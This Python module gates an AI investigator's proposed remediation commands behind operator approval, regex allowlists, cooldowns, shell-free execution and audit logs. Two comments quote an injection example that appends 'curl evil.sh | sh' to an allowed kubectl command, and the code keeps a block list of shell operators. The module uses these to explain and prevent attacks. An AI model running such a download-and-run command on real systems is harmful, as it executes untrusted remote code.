"""From "here is what I would do" to "done, with receipts" — one gate at a time.

The investigator is read-only by design, and stays read-only: this module
never gives the AGENT a pen. A report may end with a fenced ```remediation
block — structured steps, each with a command, a risk and a rollback — and the
SERVICE lifts that block into a proposal file. From there every transition is
an operator's:

    proposed ──(operator approves)──► running ──► executed | failed
        ├─────(operator rejects)───► rejected
        └──(the condition moved)───► superseded

`running` is the one state no operator can leave: only the executing task
writes it, so a process that dies mid-sequence used to strand the row there
forever — approve and reject both require `proposed`. The next boot settles
those into `failed`, recording which commands ran and which never did
(`settle_interrupted`).

Execution is dumb on purpose, and lives here beside the persistence rather than
in the service: the approved commands run exactly as written, sequentially,
stop-on-first-failure, each output captured and each command appended to the
same audit JSONL the agent's tools write to. No agent in the loop at execution
time — an agent that "adapts" an approved command is executing something nobody
approved. The service owns only the task the sequence runs in, because that is
what its shutdown has to wait for.

The gate that makes any of this runnable is the allowlist file
(HOOKPROBE_REMEDIATION_ALLOWLIST): one regex per line, hot-read at execution
time, deny-by-default. No file, no execution — proposals still collect, which
is the shipping default. A step the report itself called `high` risk must
full-match a pattern in a SECOND file as well
(HOOKPROBE_REMEDIATION_HIGH_RISK_ALLOWLIST, deny-by-default in the same
direction), so that arming remediation does not arm its worst half by the same
gesture. That label is the model's, so the second gate can only tighten — see
`step_deny_reason` for what that does and does not buy. The read-only bash guard's deny list deliberately
does NOT apply here: remediation exists to do the mutations that guard blocks,
and its gate is the operator's allowlist plus the operator's click, not a
regex that errs toward blocking investigations.

Those two gate WHO may run a procedure and WHAT it may contain. The cooldown
(`cooling`) gates HOW OFTEN: a target another procedure has just acted on is
left alone for a window, so a fix and its rollback cannot both be pressed
inside a minute. It adds no state — the refused row stays `proposed` and
becomes approvable again when the window passes.

The proposals directory is on the input guard's protected list: the agent
proposes THROUGH its report, so a direct write could only mean forging a
proposal's provenance. (A bash write around that guard still produces only a
`proposed` row — approval and the allowlist stand between it and execution.)
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import re
import shlex
import time
import uuid
from pathlib import Path
from typing import Any

from hookprobe import automation
from hookprobe.files import atomic_write

logger = logging.getLogger("hookprobe.remediation")

DIRNAME = "remediation"

_BLOCK = re.compile(r"```remediation\s*\n(.*?)```", re.DOTALL)
_MAX_STEPS = 5
_RISKS = ("low", "medium", "high")


def extract(text: str) -> list[dict[str, Any]]:
    """The steps a report proposed, validated — or nothing.

    The block stays in the report on purpose (unlike memory-suggestion
    markers): remediation advice is content a human reading the case file
    wants; this only lifts a structured copy.
    """
    match = _BLOCK.search(text or "")
    if not match:
        return []
    try:
        raw = json.loads(match.group(1))
    except ValueError:
        return []
    if not isinstance(raw, list):
        return []
    steps: list[dict[str, Any]] = []
    for entry in raw[:_MAX_STEPS]:
        if not isinstance(entry, dict):
            continue
        command = str(entry.get("command") or "").strip()
        action = str(entry.get("action") or "").strip()
        if not command or not action:
            continue
        risk = str(entry.get("risk") or "medium").strip().lower()
        steps.append(
            {
                "action": action[:200],
                "command": command[:500],
                "target": str(entry.get("target") or "").strip()[:200],
                "risk": risk if risk in _RISKS else "medium",
                "rollback": str(entry.get("rollback") or "").strip()[:500],
            }
        )
    return steps


def propose(workdir: Path, session_key: str, steps: list[dict[str, Any]], at: dict[str, Any] | None = None) -> str:
    """Park a run's steps as a proposal; returns its id.

    `at` is the cursor — what was true about the condition at the moment these
    steps were chosen (see `cursor`). Optional so a caller with no run in hand
    can still park a proposal; a row without one is simply not checked for
    movement later, which is the behaviour every row had before this existed.
    """
    directory = workdir / DIRNAME
    directory.mkdir(parents=True, exist_ok=True)
    proposal_id = uuid.uuid4().hex[:10]
    _write(
        directory / f"{proposal_id}.json",
        {
            "id": proposal_id,
            "session_key": session_key,
            "created_at": round(time.time(), 3),
            "status": "proposed",
            "steps": steps,
            "cursor": dict(at or {}),
            "results": [],
        },
    )
    automation.record(workdir, "remediation", proposal_id, "proposed", steps=len(steps))
    return proposal_id


def load(workdir: Path, proposal_id: str) -> dict[str, Any] | None:
    path = workdir / DIRNAME / f"{proposal_id}.json"
    if not re.fullmatch(r"[0-9a-f]{10}", proposal_id) or not path.is_file():
        return None
    try:
        row = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return None
    return row if isinstance(row, dict) else None


def list_all(workdir: Path, limit: int = 100) -> list[dict[str, Any]]:
    directory = workdir / DIRNAME
    rows: list[dict[str, Any]] = []
    try:
        paths = sorted(directory.glob("*.json"), key=lambda p: p.stat().st_mtime, reverse=True)
    except OSError:
        return []
    for path in paths[: max(1, limit)]:
        try:
            row = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, ValueError):
            continue
        if isinstance(row, dict):
            rows.append(row)
    return rows


def save(workdir: Path, row: dict[str, Any]) -> None:
    _write(workdir / DIRNAME / f"{row['id']}.json", row)


def settle_interrupted(workdir: Path) -> list[dict[str, Any]]:
    """Terminate rows a dead process left mid-execution; returns what it settled.

    A procedure is written as 1-2-3 and runs stop-on-first-failure, so the fact
    an operator needs before touching the target again is which commands landed.
    The results list already holds one entry per command that ran, in order —
    everything past it never started. `failed` is the terminal state for a
    sequence that did not complete, and unlike `running` it is a state the row
    can be read in.
    """
    settled: list[dict[str, Any]] = []
    for row in list_all(workdir, limit=1000):
        if row.get("status") != "running":
            continue
        commands = [str(step.get("command") or "") for step in row.get("steps") or []]
        ran = len(row.get("results") or [])
        row["status"] = "failed"
        row["executed_at"] = round(time.time(), 3)
        row["interrupted"] = {"ran": commands[:ran], "not_run": commands[ran:]}
        try:
            save(workdir, row)
        except OSError:
            continue
        settled.append(row)
    return settled


def _write(path: Path, row: dict[str, Any]) -> None:
    atomic_write(path, (json.dumps(row, ensure_ascii=False, indent=2) + "\n").encode("utf-8"))


# Tokens that only a shell can mean. A remediation command containing one of
# these cannot be executed as an argv, and running it through a shell is what
# made the allowlist unenforceable: `kubectl rollout restart .*` reads as "a
# target name may vary" and actually permitted
# `kubectl rollout restart api; curl evil.sh | sh`, because the wildcard span
# was handed to /bin/sh. So a command that needs a shell is refused instead —
# a deliberate narrowing, and the honest one: a pattern cannot bound what a
# pipeline does.
_SHELL_ONLY_TOKENS = frozenset({";", "|", "||", "&", "&&", ">", ">>", "<", "<<", "(", ")", "$"})
_SHELL_ONLY_CHARS = ("`", "\n")


def argv_for(command: str) -> tuple[list[str] | None, str]:
    """The command as an argv, or None and the reason it cannot be one.

    Lexed with punctuation_chars so every shell operator arrives as its own
    token and can be refused by identity rather than by scanning for substrings
    inside quoted text. That lexing also normalises the string-splitting trick
    (`"de""lete"` becomes `delete`), so what the allowlist matched and what
    would actually run cannot differ by quoting.
    """
    if any(char in command for char in _SHELL_ONLY_CHARS):
        return None, "command substitution or a newline needs a shell, which is not available here"
    lexer = shlex.shlex(command, posix=True, punctuation_chars=True)
    lexer.whitespace_split = True
    try:
        tokens = list(lexer)
    except ValueError as exc:
        return None, f"command is not lexable ({exc})"
    for token in tokens:
        if token in _SHELL_ONLY_TOKENS:
            return None, f"{token!r} needs a shell; an allowlist pattern cannot bound what follows it"
    if not tokens:
        return None, "empty command"
    return tokens, ""


def allowlist_patterns(path: Path | None) -> list[str]:
    """Read fresh on every call, so editing the file needs no restart.

    Called at BOTH gates — once by approve() over the whole procedure, and again
    by execute() immediately before each command. The second read is the one
    that matters for a file an operator edits during an incident: tightening the
    allowlist while a procedure is mid-flight now stops the remaining steps,
    where before the whole sequence ran against whatever the file said at the
    moment of the click.
    """
    if path is None:
        return []
    try:
        lines = path.read_text(encoding="utf-8").splitlines()
    except OSError:
        return []
    return [line.strip() for line in lines if line.strip() and not line.strip().startswith("#")]


def deny_reason(command: str, patterns: list[str]) -> str | None:
    """Why this command may not run — deny by default, allow by explicit match."""
    if not patterns:
        return "no allowlist configured (HOOKPROBE_REMEDIATION_ALLOWLIST); proposals collect, nothing executes"
    for pattern in patterns:
        try:
            if re.fullmatch(pattern, command):
                return None
        except re.error:
            continue  # a broken pattern must fail closed, not open
    return "command matches no allowlist pattern"


def step_deny_reason(
    step: dict[str, Any],
    patterns: list[str],
    high_risk_patterns: list[str],
) -> str | None:
    """Why this STEP may not run: the command gate, and a second one for `high`.

    The risk label has been in the step schema as long as `target` was, and was
    read by as little: a colour in the console and a word in the approve
    button. This is the field becoming a gate — a step the report itself called
    high risk must full-match a pattern in the high-risk file TOO, so that
    arming remediation at all does not arm its worst half by the same gesture.

    What this can and cannot be, and the difference matters more here than the
    mechanism: **the label is the model's**. A gate keyed on it can only ever
    ADD a requirement, never remove one. A step that should have said `high`
    and said `low` is refused or permitted by the ordinary allowlist exactly as
    it was before this existed — an operator-written full-match pattern, which
    is the boundary that actually holds. Read this as "the operator can reserve
    a stricter list for the commands the model is willing to call dangerous",
    not as "dangerous commands need two patterns".
    """
    reason = deny_reason(str(step.get("command") or ""), patterns)
    if reason is not None:
        return reason
    if str(step.get("risk") or "").strip().lower() != "high":
        return None
    if not high_risk_patterns:
        return (
            "step declares high risk and no high-risk allowlist is configured "
            "(HOOKPROBE_REMEDIATION_HIGH_RISK_ALLOWLIST); the ordinary allowlist does not cover it"
        )
    if deny_reason(str(step.get("command") or ""), high_risk_patterns) is not None:
        return "step declares high risk and matches no high-risk allowlist pattern"
    return None


# How long a proposal stays runnable. The same 24 hours the pipe gives a card's
# action token, deliberately one number rather than two: a button that has
# expired in chat and a console that would still run it is the kind of
# disagreement nobody discovers until it matters.
#
# The reason is not tidiness. A procedure is a set of commands chosen from
# evidence gathered at one moment — "suppress this bounce address", "restart
# that unit". Approving it a week later runs a decision made about a system
# that has since moved, and the operator pressing the button cannot see that
# from the card. Production carried four proposals waiting at once, the oldest
# eighteen hours old, with nothing between them and a shell but a click.
APPROVAL_WINDOW_SECONDS = 24 * 3600


def stale(row: dict[str, Any], now: float | None = None) -> bool:
    """Whether this proposal is past the window in which it may still be run.

    A missing or unparseable `created_at` becomes `0.0` and therefore reads as
    stale. That is deliberate and it is the safe direction: `approve` refuses on
    this, so a record nobody can date is a record nobody can run.

    It stays two-valued on purpose, and the argument was had. Three values —
    expired, live, and "no usable timestamp" — would be a state nothing has ever
    been observed in, which is the same reason `received` and `triaged` are not
    work-item states. A missing `created_at` is not something the world does; it
    is a corrupted record. The third value earns its place where the third case
    is real (a check that could not run, a target with no answer yet), not where
    it is a file that should not exist.

    The residual, so the next reader has it rather than deriving it: such a row
    is refused at the gate, hidden from the approvals page (which filters on
    `expired`), and still named on its work item as `expired unapproved` — inert
    but not invisible, which is what makes "wait for one" safe rather than a bet.
    One row existing is the trigger to revisit this.
    """
    created = float(row.get("created_at") or 0.0)
    return (now or time.time()) - created > APPROVAL_WINDOW_SECONDS


class Moved(ValueError):
    """The condition moved between the proposal and the click.

    A ValueError, so every door that already answers 409 to "you cannot approve
    that" keeps working unchanged; a subclass, so the two doors that can say
    something better than "409" are able to tell this apart from a proposal
    somebody already approved.
    """


def cursor(run: Any) -> dict[str, Any]:
    """What was true about the condition when these steps were chosen.

    The window above is a clock, and a clock is a proxy: it assumes the world
    moves at a rate. This is the world itself, as far as this node can honestly
    see it — and the whole of that honesty is that every field arrives THROUGH
    THE PIPE. Nothing here reaches out to look. The proposal's own doctrine is
    that no agent is in the loop at execution time; a freshness check that
    opened a live connection to the target would need credentials this node is
    deliberately not given (the production investigator holds none), and would
    be a second, unaudited way of touching the system the procedure is about.

    Two fields, and each is here because it moves when the other does not:

      * `recovered` — the condition ENDED. Recorded by the recovery door
        (`service.record_recovery`), which annotates the run's meta and starts
        no turn, so it never shows up as a new run. This is the one that makes
        the whole check worth having: a procedure written for a firing alert,
        approved after it cleared, is the "二次误操作" this exists to stop.
      * `run_id` — this investigation has taken another TURN. Changed by
        `continue_run`, which is what a re-fire, a thread reply and a follow-up
        press all end up calling, so one field covers all three. The steps were
        lifted from a report that is no longer this session's newest.

    What was considered and left out: the thread's reply count, and the re-fire
    count. Both are real, both are already recorded — and neither can move
    without `run_id` moving too, because both go through `continue_run`. A field
    that cannot fire on its own is not a signal, it is a second copy of one.
    (`refires` is still READ below, to say WHY the run id changed. That is
    explanation, not detection.)
    """
    meta = getattr(run, "meta", None) or {}
    return {
        "run_id": str(getattr(run, "run_id", "") or ""),
        "recovered": bool(meta.get("recovered_at")),
        "refires": _count(meta.get("refires")),
    }


def _count(value: Any) -> int:
    try:
        return int(value or 0)
    except (TypeError, ValueError):
        return 0


def moved(before: dict[str, Any], now: dict[str, Any]) -> str:
    """One sentence naming what changed since the proposal, or "" if nothing did.

    Ordered by what an operator most needs to hear first. A proposal stamped
    before this check existed carries no cursor, and gets the old behaviour
    rather than a refusal invented out of a missing field.
    """
    if not before or not now:
        return ""
    if now.get("recovered") and not before.get("recovered"):
        return "the condition ended after these steps were written"
    if now.get("run_id") and now.get("run_id") != before.get("run_id"):
        if _count(now.get("refires")) > _count(before.get("refires")):
            return "the condition fired again and this investigation has looked at it since"
        return "this investigation has taken another turn since these steps were written"
    return ""


# How long one target is left alone after a procedure has acted on it. The
# proposal flow gates WHO may run a procedure and WHAT it may contain; nothing
# in it gated HOW OFTEN. Two proposals naming the same host — a re-fire's
# investigation and the original's, or a fix and the rollback of that fix —
# could both be approved inside a minute, and the second acted on a machine the
# first had just changed and nobody had looked at since. That is a flap, and a
# flap is how a remediation loop turns one incident into an outage.
#
# 15 minutes is chosen to be longer than a procedure runs (five steps, each
# capped at the bash timeout) and shorter than a human's attention on an
# incident: long enough that the second press has to be deliberate, short
# enough that it is not a lockout. 0 disables the whole rule.
COOLDOWN_SECONDS = 900

# The states in which a proposal has already put commands on a target. `running`
# counts because it is the worst case, not the mildest: two sequences
# interleaving their steps against one host is a state neither procedure was
# written for. It is the one status held with no window at all, which is bounded
# rather than forever: the next boot settles a stranded `running` row into
# `failed` (`settle_interrupted`), and from there the clock applies.
_ACTED_STATUSES = ("running", "executed", "failed")


def _normal(value: Any) -> str:
    return " ".join(str(value or "").split()).lower()


def cooldown_keys(step: dict[str, Any]) -> set[str]:
    """What a step is ABOUT — BOTH its declared target and its literal command.

    `target` was in the step schema from the first commit and read by nothing:
    the model was already being asked to name the host, service or resource each
    command touches, and every one of those answers was stored and ignored. This
    is that field finally load-bearing.

    It is not load-bearing ALONE, and production is why. The five proposals
    sitting on the deployment name their target three different ways for one
    thing — `AWS SES 账户状态`, `AWS SES account status`, `AWS SES 账户状态（只读）`
    — while running character-identical commands. Keying on the target and
    falling back to the command was the first version of this, and on that data
    it would have cooled nothing: the label varies, the command does not.

    So both count, and a match on either cools. The command is the honest half:
    `execute()` runs it verbatim from one container, so two identical command
    strings ARE the same action against the same thing, whatever they were
    labelled. The target catches what the command cannot — a fix and its
    rollback are different text against one machine.

    BE CLEAR ABOUT WHO WRITES THESE KEYS. The model writes both. A step that
    varies its command by a flag AND names its target differently keys
    differently and is not cooled. Like the input guard, this catches the
    over-eager model, which is the case that happens, and not an adversary; what
    bounds an adversary is the allowlist and the operator's click, both of which
    are the operator's own text.
    """
    return {key for key in (_normal(step.get("target")), _normal(step.get("command"))) if key}


def _keys(row: dict[str, Any]) -> set[str]:
    keys: set[str] = set()
    for step in row.get("steps") or []:
        keys |= cooldown_keys(step)
    return keys


def _targets(row: dict[str, Any]) -> set[str]:
    return {key for key in (_normal(step.get("target")) for step in row.get("steps") or []) if key}


def _label(shared: set[str], *rows: dict[str, Any]) -> str:
    """The shared key to say out loud: a declared target where there is one,
    because `AWS SES account status` is what an operator recognises and a
    120-character aws invocation is not."""
    named = shared & set().union(*(_targets(row) for row in rows))
    label = sorted(named or shared)[0]
    return label if len(label) <= 80 else label[:77] + "..."


class Cooling(ValueError):
    """Something else acted on this target recently, so this is not run NOW.

    A ValueError like `Moved`, so every door already answering 409 keeps
    working — but unlike `Moved` this is not terminal and the row is left
    `proposed`: the condition has not moved, the clock has not run out, and the
    same procedure is approvable once the window passes. The refusal therefore
    names the age and the window it fell inside, not a state it has been put in.
    """


def cooling(
    row: dict[str, Any],
    rows: list[dict[str, Any]],
    *,
    window: int = COOLDOWN_SECONDS,
    now: float | None = None,
) -> str:
    """Why this procedure should not run yet, or "" when it may.

    Pure over rows already loaded, because both callers have them: the button is
    not drawn when the target is cooling, and the approval is refused for the
    race the button cannot see — the same two-place shape as the freshness
    cursor, and for the same reason. A button that cannot work is worse than an
    absent one, and a card sent while the target was free can still be pressed
    after another procedure has touched it.
    """
    if window <= 0:
        return ""
    keys = _keys(row)
    if not keys:
        return ""
    now = time.time() if now is None else now
    acted: list[tuple[dict[str, Any], set[str]]] = []
    for other in rows:
        if str(other.get("id") or "") == str(row.get("id") or ""):
            continue
        if str(other.get("status") or "") not in _ACTED_STATUSES:
            continue
        shared = keys & _keys(other)
        if shared:
            acted.append((other, shared))
    for other, shared in acted:
        if other.get("status") == "running":
            return f"{_label(shared, row, other)} is being acted on right now by proposal {other.get('id')}"
    for other, shared in acted:
        # `executed_at` is stamped by both endings; `approved_at` covers the row
        # a crash left without one. A row with neither reads as ancient and cools
        # nothing — absent is not stale, the same rule the cursor follows for a
        # proposal stamped before the cursor existed.
        when = float(other.get("executed_at") or other.get("approved_at") or 0.0)
        if when and now - when < window:
            return (
                f"{_label(shared, row, other)} was acted on {(now - when) / 60:.0f}m ago by proposal "
                f"{other.get('id')} ({other.get('status')}), inside the "
                f"{window // 60}m cooldown"
            )
    return ""


def approve(
    workdir: Path,
    proposal_id: str,
    *,
    allowlist: Path | None,
    high_risk_allowlist: Path | None = None,
    note: str = "",
    at: dict[str, Any] | None = None,
    cooldown: int = COOLDOWN_SECONDS,
) -> dict[str, Any]:
    """The operator's click. Gate-checks EVERY step against the allowlist
    before anything runs — a proposal that is half executable is refused
    whole, because "steps 1 and 3 ran" is the worst possible outcome of a
    procedure written as 1-2-3.

    `at` is the condition as it stands NOW. If it has moved since the proposal
    was written the procedure is retired rather than run — see `moved` for the
    two things that count as moving, and the module docstring for why the exit
    is terminal instead of a warning the operator can press through: the button
    on a card is single-use and gone after one press, so "refuse, and let them
    decide again" is a UI that does not exist. What does exist is the follow-up
    button beside it, which re-investigates and proposes against the world as it
    is now — which is the answer anyway.

    The cooldown is checked LAST, after the allowlist, because the two refusals
    are different in kind: a command no allowlist permits can never run as
    written, and answering "wait 9 minutes" to it would be a lie of omission.
    Order the permanent refusal first.
    """
    row = load(workdir, proposal_id)
    if row is None:
        raise LookupError("no such proposal")
    if row.get("status") != "proposed":
        raise ValueError(f"proposal is {row.get('status')}, not proposed")
    change = moved(row.get("cursor") or {}, at or {})
    if change:
        row["status"] = "superseded"
        row["resolved_at"] = round(time.time(), 3)
        row["superseded_because"] = change
        save(workdir, row)
        # Deliberately NOT recorded on the automation ledger. That ledger counts
        # what a PERSON decided about a suggestion — approved, dismissed,
        # regretted — and it feeds the graduation figures. A procedure the
        # condition outran is not a human dismissal, and counting it as one
        # would quietly make the machine look more often overruled than it was.
        raise Moved(
            f"{change}. Nothing ran, and this procedure is retired. "
            "Ask this investigation for a fresh look if the condition still needs one."
        )
    if stale(row):
        age_h = (time.time() - float(row.get("created_at") or 0.0)) / 3600
        raise ValueError(
            f"proposed {age_h:.0f}h ago, past the {APPROVAL_WINDOW_SECONDS // 3600}h window: "
            "these commands were chosen from evidence that has since moved. Ask for a fresh look."
        )
    patterns = allowlist_patterns(allowlist)
    high_risk = allowlist_patterns(high_risk_allowlist)
    for step in row.get("steps", []):
        reason = step_deny_reason(step, patterns, high_risk)
        if reason is not None:
            raise PermissionError(f"step '{step.get('action')}': {reason}")
    reason = cooling(row, list_all(workdir, limit=200), window=cooldown)
    if reason:
        # The row stays `proposed`. Nothing about it has been decided — not by
        # the condition, not by the clock, not by a person — so it is not on the
        # automation ledger either, for the same reason `superseded` is not: that
        # ledger counts what a HUMAN decided, and "another procedure got there
        # first" is not a human overruling anything.
        logger.warning("remediation approval refused, target cooling: %s — %s", proposal_id, reason)
        raise Cooling(
            f"{reason}. Nothing ran. Let the first procedure's change settle and "
            "press again, or ask this investigation for a fresh look at what the "
            "target needs now."
        )
    row["status"] = "running"
    row["approved_at"] = round(time.time(), 3)
    row["approved_note"] = note[:300]
    save(workdir, row)
    automation.record(workdir, "remediation", proposal_id, "approved")
    return row


def reject(workdir: Path, proposal_id: str) -> dict[str, Any]:
    row = load(workdir, proposal_id)
    if row is None:
        raise LookupError("no such proposal")
    if row.get("status") != "proposed":
        raise ValueError(f"proposal is {row.get('status')}, not proposed")
    row["status"] = "rejected"
    row["resolved_at"] = round(time.time(), 3)
    save(workdir, row)
    automation.record(workdir, "remediation", proposal_id, "dismissed")
    return row


# What an approved command is allowed to see. An ALLOWLIST, not a scrub, and
# that is the difference from the agent's subprocess: `gate.SECRETS_WITHHELD_FROM_AGENT`
# names the secrets this repository knows it holds, which is the right shape when
# the process must keep working with everything else. Here the process is a
# short procedure an operator approved, its needs are known, and the thing a
# denylist cannot cover is the secret a future deployment adds under a name
# nobody here has written down.
#
# Until this, `create_subprocess_exec` passed no `env` at all, so an approved
# command inherited the SERVICE's whole environment: the family's HMAC signing
# keys, the Lark app secret, the provider credential. Three things stood in
# front of it — a deny-by-default allowlist, a human click, and no shell — and
# none of them is a reason to hand a procedure the keys it does not need. The
# agent's own shell was scrubbed for exactly this argument; the one path that
# actually EXECUTES was never given the same treatment.
_EXEC_ENV_KEEP = frozenset({"PATH", "HOME", "USER", "LOGNAME", "LANG", "TZ", "TMPDIR"})
_EXEC_ENV_PREFIXES = (
    # The credentials an operator mounts FOR this: the whole point of a
    # danger-only node is that its procedures can reach a cloud.
    "AWS_",
    "KUBE",
    "GOOGLE_",
    "AZURE_",
    "LC_",
    # The egress boundary. Dropping these would make an approved command the one
    # thing on the node that goes out without passing the allowlist — a fix that
    # created a hole would be a poor trade for closing one.
    "HTTP_PROXY",
    "HTTPS_PROXY",
    "NO_PROXY",
    "ALL_PROXY",
    "http_proxy",
    "https_proxy",
    "no_proxy",
    "all_proxy",
)


def execution_env() -> dict[str, str]:
    """The environment an approved command runs in: what it needs, nothing else.

    Loud rather than silent if it is wrong. A command that needs a variable this
    does not pass fails with its own error, in the results the operator reads —
    where a command that quietly carried a signing key leaves no trace at all.
    """
    kept = {}
    for name, value in os.environ.items():
        if name in _EXEC_ENV_KEEP or name.startswith(_EXEC_ENV_PREFIXES):
            kept[name] = value
    return kept


async def execute(
    workdir: Path,
    row: dict[str, Any],
    *,
    bash_timeout_ms: int,
    allowlist: Path | None = None,
    high_risk_allowlist: Path | None = None,
) -> None:
    """Approved commands run EXACTLY as written: sequentially, stop on the
    first failure, output captured, every command on the audit log. No
    agent in this loop — an agent that adapts an approved command is
    executing something nobody approved.

    NO SHELL. Each command is lexed into an argv and exec'd directly, so the
    allowlist pattern that permitted it bounds what actually runs. Under a shell
    it did not: any pattern with a wildcard handed that span to /bin/sh, and
    `kubectl rollout restart .*` — written to let a target name vary — also
    permitted `; curl evil.sh | sh`. A command that genuinely needs a shell is
    refused with a reason rather than quietly widened.

    The allowlist is re-checked HERE, per command, not only at the click. An
    operator tightening the file during an incident should stop the steps that
    have not run yet; approve-time-only meant the whole sequence ran against
    whatever the file said when the button was pressed.
    """
    timeout = max(30.0, (bash_timeout_ms or 120000) / 1000.0)
    failed = False
    for step in row.get("steps", []):
        command = str(step.get("command") or "")
        started = time.monotonic()
        # Second gate. Deny-by-default holds: a file that has since been emptied
        # or narrowed stops the rest of the procedure. BOTH files are re-read,
        # for the same reason the first one is — an operator who empties the
        # high-risk list mid-incident stops the high-risk steps that have not
        # run, and a procedure whose remaining steps are all `low` carries on.
        refusal = step_deny_reason(step, allowlist_patterns(allowlist), allowlist_patterns(high_risk_allowlist))
        if refusal is None:
            argv, refusal = argv_for(command)
        else:
            argv = None
        if argv is None:
            row.setdefault("results", []).append(
                {
                    "command": command,
                    "exit": -1,
                    "ms": 0,
                    "output": f"refused at execution: {refusal}",
                }
            )
            logger.warning("remediation step refused at execution: %s — %s", command, refusal)
            failed = True
            break
        try:
            process = await asyncio.create_subprocess_exec(
                *argv,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
                cwd=str(workdir),
                env=execution_env(),
            )
            try:
                output, _ = await asyncio.wait_for(process.communicate(), timeout=timeout)
            except TimeoutError:
                process.kill()
                await process.wait()
                output, returncode = b"(timed out)", -1
            else:
                returncode = int(process.returncode or 0)
        except OSError as exc:
            output, returncode = str(exc).encode(), -1
        result = {
            "command": command,
            "exit": returncode,
            "ms": int((time.monotonic() - started) * 1000),
            "output": output.decode("utf-8", "replace")[-10000:],
        }
        row.setdefault("results", []).append(result)
        _audit(workdir, row["id"], command, returncode != 0)
        if returncode != 0:
            failed = True
            break
    row["status"] = "failed" if failed else "executed"
    row["executed_at"] = round(time.time(), 3)
    try:
        save(workdir, row)
    except OSError:
        # The commands have already run; losing the write would leave the row
        # saying `running` with nobody to correct it, so it is worth a loud
        # line. The audit log above still has every command, and the next
        # boot's sweep settles the row.
        logger.exception("remediation %s id=%s but the row could not be written", row["status"], row["id"])
    logger.info("remediation %s id=%s", row["status"], row["id"])


def _audit(workdir: Path, proposal_id: str, command: str, error: bool) -> None:
    """Same flight recorder the agent's tools write to — one account."""
    try:
        audit_dir = workdir / "audit"
        audit_dir.mkdir(parents=True, exist_ok=True)
        line = {
            "ts": round(time.time(), 3),
            "session": f"remediation:{proposal_id}",
            "tool": "Exec",
            "detail": command[:300],
            "error": error,
        }
        with (audit_dir / (time.strftime("%Y-%m-%d") + ".jsonl")).open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(line, ensure_ascii=False) + "\n")
    except OSError:
        logger.debug("remediation audit write failed", exc_info=True)
